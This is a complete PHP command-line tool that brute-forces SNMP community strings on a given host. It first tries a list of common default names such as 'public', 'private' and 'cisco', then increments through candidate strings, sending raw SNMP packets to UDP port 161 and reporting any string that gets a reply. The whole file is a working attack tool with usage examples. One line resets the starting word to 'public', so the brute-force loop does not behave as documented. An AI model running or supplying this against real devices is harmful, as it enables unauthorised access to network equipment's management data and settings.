#!/usr/bin/php
<?php
/* 
SNMP Communities name Brute-Forcer
-=-=-=-=-=-=-=-=-=-=-=-=-=-
Usage: php scbf.php [host] [-A|-a] [min length]-[Max length] [timeout]

-A => UPPERCASE
-a => lowercase

Example: php scbf.php 192.168.50.1 -a 5-10 1

Author: NetJackal
E-mail:nima_501@yahoo.com
Website: http://netjackal.by.ru
*/
$usage="\nUsage: php scbf.php [host] [-A|-a] [min length]-[Max length] [timeout]\n\n-A => UPPERCASE\n-a => lowercase\n\nExample: php scbf.php 192.168.50.1 -a 5-10 1\n";
if($argc<4)    die($usage);
$host = $argv[1];
$case = ($argv[2]=='-A')?'A':'a';
$timeout=(isset($argv[4]))?$argv[4]:1;
$len = explode('-',$argv[3]);
$common = array('public','Public',' private','Private','privatew','allprivate',
'all private','community','Community','secret','world','read','read_AU','trap',
'read_only','write','nowrite','write_AU','community','network','router','cisco',
'hidden','internal','snmp','snmpd','admin','monitor','secure','proxy','access',
'root','enable','test','guest','set','armon','security','netman','beta','startek',
'StarTek');
if ($len[0]>$len[1]) die("\nBad length!\n");
echo "--=Checking common names...\n";
for($i=0;$i<count($common);$i++)if(check($common[$i])) {echo "\nCommunities name is: $common[$i]\n";ask();}
echo "Brute-Forcing started...";
$word = "";
for($i=0;$i<$len[0];$i++)$word.=$case;
$word = "public";
while(strlen($word)<=$len[1]){
    if(check($word)) {echo "\nCommunities name is: $word\n";ask();}
    $word++;
}
echo "\n\nDone!\n";

function check($com){
global $host,$timeout;
$packet = "0&".chr(2).chr(1).chr(0).chr(4).chr(strlen($com)).$com.chr(160).chr(25).chr(2).chr(1)."/".chr(2).chr(1).chr(0).chr(2).chr(1).chr(0)."0".chr(14)."0".chr(12).chr(6).chr(8)."+".chr(6).chr(1).chr(2).chr(1).chr(1).chr(2).chr(0).chr(5).chr(0);
$sock=fsockopen("udp://$host",161);
fputs($sock,$packet);
socket_set_timeout($sock,$timeout);
fputs($sock,$packet);
$res = fgets($sock);
fclose($sock);
if($res!="") return 1;
return 0;
}
function ask(){
while(1){
echo "\nDo you want to continue?(y/n)";
$answer = strtolower(trim(fgets(STDIN)));
echo $answer{0};
if($answer{0}=="y" || $answer{0}=="n")break;
}
if($answer=="n")die();
}
?>